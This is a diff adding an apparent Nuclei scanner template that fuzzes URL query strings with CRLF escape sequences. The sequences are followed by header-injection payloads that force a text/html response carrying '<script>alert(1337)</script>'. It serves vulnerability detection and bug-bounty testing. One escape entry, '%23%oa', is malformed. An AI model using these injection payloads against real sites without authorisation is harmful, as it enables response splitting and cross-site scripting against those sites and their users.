@@ -1,0 +1,80 @@
+id: black-fun-crlf-injection
+
+info:
+  name: Black Fun CRLF Injection
+  author: reewardius
+  severity: medium
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: fuzzing-crlf,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      escape:
+        - "%00"
+        - "%09%0A"
+        - "%09%0D"
+        - "%09%0D%0A"
+        - "%0a"
+        - "%0a%20"
+        - "%0d"
+        - "%0d%09"
+        - "%0d%0a"
+        - "%0d%0a%09"
+        - "%0d%0a%20"
+        - "%0d%20"
+        - "%20"
+        - "%20%0a"
+        - "%20%0d"
+        - "%20%0d%0a"
+        - "%23%0a"
+        - "%23%0a%20"
+        - "%23%0d"
+        - "%23%0d%0a"
+        - "%23%oa"
+        - "%25%30"
+        - "%25%30%61"
+        - "%2e%2e%2f%0d%0a"
+        - "%2f%2e%2e%0d%0a"
+        - "%2f..%0d%0a"
+        - "%3f"
+        - "%3f%0a"
+        - "%3f%0d"
+        - "%3f%0d%0a"
+        - "%e5%98%8a%e5%98%8d"
+        - "%e5%98%8a%e5%98%8d%0a"
+        - "%e5%98%8a%e5%98%8d%0d"
+        - "%e5%98%8a%e5%98%8d%0d%0a"
+        - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
+        - "%u0000"
+        - "%u000a"
+        - "%u000d"
+        
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{escape}}X-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr"
+          - "{{escape}}X-XSS-Protection:0%0D%0AContent-Type:text/html%0D%0AContent-Length:39%0D%0A%0D%0A%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr"
+          - "{{escape}}X-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(1337)</script><!--"
+          - "{{escape}}Set-Cookie:%20value=<script>alert(1337)</script>%0D%0AContent-Type:text/html"
+          - "{{escape}}X-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(1337)</script><!--"
+          - "{{escape}}%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(1337)</script><!--"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<script>alert(1337)</script>'
+      - type: word
+        part: header
+        words:
+          - "text/html"
